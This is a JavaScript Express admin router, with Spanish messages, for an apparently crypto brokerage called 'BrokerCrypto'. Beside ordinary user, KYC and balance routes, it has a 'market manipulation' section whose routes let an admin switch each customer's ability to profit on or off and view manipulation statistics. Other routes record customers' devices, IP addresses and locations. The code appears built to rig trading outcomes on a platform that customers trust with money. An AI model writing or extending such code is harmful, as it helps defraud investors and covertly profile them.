const express = require("express");
const router = express.Router();
const User = require("../models/User");
const Transaction = require("../models/Transaction");
const Order = require("../models/Order");
const auth = require("../middleware/auth");
const MarketManipulationService = require("../services/MarketManipulationService");
const axios = require("axios");
const bcrypt = require("bcryptjs");
const DeviceInfo = require("../models/DeviceInfo");

// Middleware para verificar si el usuario es admin
const isAdmin = (req, res, next) => {
  if (req.user.role !== "admin") {
    return res.status(403).json({ msg: "Acceso denegado" });
  }
  next();
};

// Rutas de usuarios
router.get("/users", auth, isAdmin, async (req, res) => {
  try {
    const users = await User.find().select("-password");
    res.json(users);
  } catch (err) {
    console.error(err.message);
    res.status(500).json({ msg: "Error del servidor" });
  }
});

router.get("/users/:userId", auth, isAdmin, async (req, res) => {
  try {
    const user = await User.findById(req.params.userId).select("-password");
    if (!user) {
      return res.status(404).json({ msg: "Usuario no encontrado" });
    }
    res.json(user);
  } catch (err) {
    console.error(err.message);
    res.status(500).json({ msg: "Error del servidor" });
  }
});

router.put("/users/:userId", auth, isAdmin, async (req, res) => {
  const { firstName, lastName, email, username } = req.body;
  try {
    let user = await User.findById(req.params.userId);
    if (!user) {
      return res.status(404).json({ msg: "Usuario no encontrado" });
    }

    if (email !== user.email || username !== user.username) {
      const existingUser = await User.findOne({
        $and: [
          { _id: { $ne: req.params.userId } },
          { $or: [{ email }, { username }] },
        ],
      });

      if (existingUser) {
        return res
          .status(400)
          .json({ msg: "Email o nombre de usuario ya existe" });
      }
    }

    user.firstName = firstName;
    user.lastName = lastName;
    user.email = email;
    user.username = username;
    await user.save();
    res.json(user);
  } catch (err) {
    console.error(err.message);
    res.status(500).json({ msg: "Error del servidor" });
  }
});

router.put("/users/:userId/password", auth, isAdmin, async (req, res) => {
  const { newPassword } = req.body;
  try {
    const user = await User.findById(req.params.userId);
    if (!user) {
      return res.status(404).json({ msg: "Usuario no encontrado" });
    }
    const salt = await bcrypt.genSalt(10);
    user.password = await bcrypt.hash(newPassword, salt);
    await user.save();
    res.json({ msg: "Contraseña actualizada con éxito" });
  } catch (err) {
    console.error(err.message);
    res.status(500).json({ msg: "Error del servidor" });
  }
});

router.put("/users/:userId/toggle-status", auth, isAdmin, async (req, res) => {
  try {
    const user = await User.findById(req.params.userId);
    if (!user) {
      return res.status(404).json({ msg: "Usuario no encontrado" });
    }
    user.isBlocked = !user.isBlocked;
    await user.save();
    res.json({
      msg: user.isBlocked ? "Usuario bloqueado" : "Usuario desbloqueado",
      isBlocked: user.isBlocked,
      user: {
        ...user.toObject(),
        password: undefined,
      },
    });
  } catch (err) {
    console.error("Error en toggle-status:", err);
    res.status(500).json({ msg: "Error del servidor" });
  }
});

// Rutas de KYC
router.put("/users/:userId/kyc-status", auth, isAdmin, async (req, res) => {
  try {
    const { status, rejectionReason } = req.body;
    const user = await User.findById(req.params.userId);

    if (!user) {
      return res.status(404).json({ msg: "Usuario no encontrado" });
    }

    if (!["verified", "rejected"].includes(status)) {
      return res.status(400).json({ msg: "Estado de KYC inválido" });
    }

    user.kycStatus = status;
    if (status === "verified") {
      user.kycVerificationDate = new Date();
      user.kycRejectionReason = null;
    } else {
      user.kycRejectionReason = rejectionReason || "No se proporcionó razón";
      user.kycVerificationDate = null;
    }

    await user.save();
    res.json({
      msg: status === "verified" ? "KYC verificado con éxito" : "KYC rechazado",
      user: {
        ...user.toObject(),
        password: undefined,
      },
    });
  } catch (err) {
    console.error("Error en actualización de KYC:", err);
    res.status(500).json({ msg: "Error del servidor" });
  }
});

// Rutas de transacciones
router.post("/deposit", auth, isAdmin, async (req, res) => {
  const { userId, amountEUR } = req.body;

  if (!userId || !amountEUR) {
    return res.status(400).json({
      msg: "Se requieren userId y amountEUR",
    });
  }

  try {
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ msg: "Usuario no encontrado" });
    }

    const amount = parseFloat(amountEUR);
    if (isNaN(amount) || amount <= 0) {
      return res.status(400).json({ msg: "Monto inválido" });
    }

    const newTransaction = new Transaction({
      user: user._id,
      type: "deposit",
      amount: amount,
      currency: "EUR",
      status: "completed",
      description: `Depósito administrativo de ${amount} EUR`,
    });

    await newTransaction.save();
    user.balanceEUR = (user.balanceEUR || 0) + amount;
    user.transactions.push(newTransaction._id);
    await user.save();

    res.json({
      msg: "Depósito realizado con éxito",
      newBalanceEUR: user.balanceEUR,
      transaction: newTransaction,
    });
  } catch (err) {
    console.error(err.message);
    res.status(500).json({ msg: "Error del servidor", error: err.message });
  }
});

router.post("/withdraw", auth, isAdmin, async (req, res) => {
  const { userId, amountEUR } = req.body;

  if (!userId || !amountEUR) {
    return res.status(400).json({
      msg: "Se requieren userId y amountEUR",
    });
  }

  try {
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ msg: "Usuario no encontrado" });
    }

    const amount = parseFloat(amountEUR);
    if (isNaN(amount) || amount <= 0) {
      return res.status(400).json({ msg: "Monto inválido" });
    }

    if (user.balanceEUR < amount) {
      return res.status(400).json({ msg: "Saldo insuficiente" });
    }

    const newTransaction = new Transaction({
      user: user._id,
      type: "withdraw",
      amount: amount,
      currency: "EUR",
      status: "completed",
      description: `Retiro administrativo de ${amount} EUR`,
    });

    await newTransaction.save();
    user.balanceEUR -= amount;
    user.transactions.push(newTransaction._id);
    await user.save();

    res.json({
      msg: "Retiro realizado con éxito",
      newBalanceEUR: user.balanceEUR,
      transaction: newTransaction,
    });
  } catch (err) {
    console.error(err.message);
    res.status(500).json({ msg: "Error del servidor", error: err.message });
  }
});

router.get("/transactions/:userId", auth, isAdmin, async (req, res) => {
  try {
    const transactions = await Transaction.find({
      user: req.params.userId,
    }).sort({ date: -1 });

    if (!transactions) {
      return res.status(404).json({ msg: "No se encontraron transacciones" });
    }

    res.json(transactions);
  } catch (err) {
    console.error(err.message);
    res.status(500).json({ msg: "Error del servidor" });
  }
});

// Rutas de manipulación del mercado
router.get(
  "/market-manipulation/users/search/email/:email",
  auth,
  isAdmin,
  async (req, res) => {
    try {
      const users = await MarketManipulationService.searchUsersByEmail(
        req.params.email
      );
      res.json(users);
    } catch (err) {
      console.error(err.message);
      res.status(500).json({ msg: "Error en la búsqueda", error: err.message });
    }
  }
);

router.get(
  "/market-manipulation/users/search/name/:name",
  auth,
  isAdmin,
  async (req, res) => {
    try {
      const users = await MarketManipulationService.searchUsersByName(
        req.params.name
      );
      res.json(users);
    } catch (err) {
      console.error(err.message);
      res.status(500).json({ msg: "Error en la búsqueda", error: err.message });
    }
  }
);

router.get(
  "/market-manipulation/users/search/date/:date",
  auth,
  isAdmin,
  async (req, res) => {
    try {
      const users = await MarketManipulationService.searchUsersByDate(
        req.params.date
      );
      res.json(users);
    } catch (err) {
      console.error(err.message);
      res.status(500).json({ msg: "Error en la búsqueda", error: err.message });
    }
  }
);

router.patch(
  "/market-manipulation/toggle-profits/:userId",
  auth,
  isAdmin,
  async (req, res) => {
    try {
      const { userId } = req.params;
      const { allowProfits } = req.body;
      const user = await MarketManipulationService.toggleUserProfits(
        userId,
        allowProfits
      );
      res.json(user);
    } catch (err) {
      console.error(err.message);
      res
        .status(500)
        .json({ msg: "Error al actualizar usuario", error: err.message });
    }
  }
);

router.get("/market-manipulation/stats", auth, isAdmin, async (req, res) => {
  try {
    const stats = await MarketManipulationService.getManipulationStats();
    res.json(stats);
  } catch (err) {
    console.error(err.message);
    res
      .status(500)
      .json({ msg: "Error al obtener estadísticas", error: err.message });
  }
});

// Rutas de información de dispositivos
router.get("/users-device-info", auth, isAdmin, async (req, res) => {
  try {
    const usersWithDeviceInfo = await User.aggregate([
      {
        $lookup: {
          from: "deviceinfos",
          localField: "_id",
          foreignField: "userId",
          as: "deviceInfo",
        },
      },
      {
        $unwind: {
          path: "$deviceInfo",
          preserveNullAndEmptyArrays: true,
        },
      },
      {
        $project: {
          _id: 1,
          email: 1,
          username: 1,
          name: {
            $concat: [
              { $ifNull: ["$firstName", ""] },
              " ",
              { $ifNull: ["$lastName", ""] },
            ],
          },
          deviceInfo: {
            ip: 1,
            browser: 1,
            os: 1,
            device: 1,
            language: 1,
            location: 1,
            connection: 1,
            lastUpdate: 1,
          },
          lastLogin: "$deviceInfo.lastUpdate",
        },
      },
    ]);

    res.json(usersWithDeviceInfo);
  } catch (error) {
    res.status(500).json({ message: "Error del servidor" });
  }
});

// Ruta para actualizar la ubicación
router.post("/update-location", auth, isAdmin, async (req, res) => {
  try {
    const { latitude, longitude } = req.body;

    if (!latitude || !longitude) {
      return res.status(400).json({
        msg: "Se requiere latitud y longitud",
      });
    }

    try {
      const response = await axios.get(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=es`,
        {
          headers: {
            "User-Agent": "BrokerCrypto/1.0",
          },
        }
      );

      if (response.data) {
        const locationData = response.data;

        const deviceInfo = await DeviceInfo.findOneAndUpdate(
          { userId: req.user.id },
          {
            $set: {
              "location.latitude": latitude,
              "location.longitude": longitude,
              "location.country": locationData.address.country || "Desconocido",
              "location.city":
                locationData.address.city ||
                locationData.address.town ||
                locationData.address.village ||
                "Desconocido",
              "location.authorized": true,
              "location.lastUpdate": new Date(),
              "location.address": locationData.display_name || "No disponible",
            },
          },
          { new: true, upsert: true }
        );

        await User.findByIdAndUpdate(req.user.id, {
          $set: {
            lastKnownLocation: {
              latitude,
              longitude,
              country: locationData.address.country,
              city:
                locationData.address.city ||
                locationData.address.town ||
                locationData.address.village,
              address: locationData.display_name,
              lastUpdate: new Date(),
            },
          },
        });

        await new Promise((resolve) => setTimeout(resolve, 1000));

        res.json({
          msg: "Ubicación actualizada con éxito",
          location: deviceInfo.location,
        });
      } else {
        throw new Error("No se pudo obtener información de la ubicación");
      }
    } catch (geoError) {
      console.error("Error en geocodificación:", geoError);

      // Si falla la geocodificación, al menos guardamos las coordenadas
      const deviceInfo = await DeviceInfo.findOneAndUpdate(
        { userId: req.user.id },
        {
          $set: {
            "location.latitude": latitude,
            "location.longitude": longitude,
            "location.authorized": true,
            "location.lastUpdate": new Date(),
          },
        },
        { new: true, upsert: true }
      );

      res.json({
        msg: "Solo se pudieron guardar las coordenadas",
        location: deviceInfo.location,
      });
    }
  } catch (error) {
    console.error("Error al actualizar la ubicación:", error);
    res.status(500).json({
      msg: "Error al actualizar la ubicación",
      error: error.message,
    });
  }
});

// Obtener estadísticas de dispositivos
router.get("/device-stats", auth, isAdmin, async (req, res) => {
  try {
    const deviceInfos = await DeviceInfo.find();

    const stats = {
      totalDevices: deviceInfos.length,
      browsers: {},
      operatingSystems: {},
      deviceTypes: {},
      locations: {},
      connectionTypes: {},
    };

    deviceInfos.forEach((device) => {
      const browserName = device.browser?.name || "unknown";
      stats.browsers[browserName] = (stats.browsers[browserName] || 0) + 1;

      const osName = device.os?.name || "unknown";
      stats.operatingSystems[osName] =
        (stats.operatingSystems[osName] || 0) + 1;

      const deviceType = device.device?.type || "unknown";
      stats.deviceTypes[deviceType] = (stats.deviceTypes[deviceType] || 0) + 1;

      const country = device.location?.country || "unknown";
      stats.locations[country] = (stats.locations[country] || 0) + 1;

      const connectionType = device.connection?.type || "unknown";
      stats.connectionTypes[connectionType] =
        (stats.connectionTypes[connectionType] || 0) + 1;
    });

    res.json(stats);
  } catch (error) {
    console.error("Error al obtener estadísticas de dispositivos:", error);
    res.status(500).json({ msg: "Error del servidor" });
  }
});

// Obtener información de un dispositivo específico
router.get("/device-info/:userId", auth, isAdmin, async (req, res) => {
  try {
    const deviceInfo = await DeviceInfo.findOne({ userId: req.params.userId });
    if (!deviceInfo) {
      return res
        .status(404)
        .json({ msg: "No se encontró información del dispositivo" });
    }
    res.json(deviceInfo);
  } catch (error) {
    console.error("Error al obtener información del dispositivo:", error);
    res.status(500).json({ msg: "Error del servidor" });
  }
});

module.exports = router;
